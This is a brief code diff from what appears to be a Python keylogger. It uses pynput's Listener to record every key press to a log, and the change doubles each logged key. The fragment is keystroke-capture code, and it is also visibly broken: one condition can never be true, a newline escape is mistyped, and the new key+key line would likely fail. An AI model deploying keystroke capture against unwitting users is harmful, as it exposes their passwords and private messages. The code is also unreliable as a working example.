@@ -9,7 +9,7 @@ def on_press(key):
     if key == Key.enter and key == Key.tab:
         print('/n')
         
-    logging.info(key)
+    logging.info(key+key)
 
 with Listener(on_press=on_press) as listener:
     listener.join()
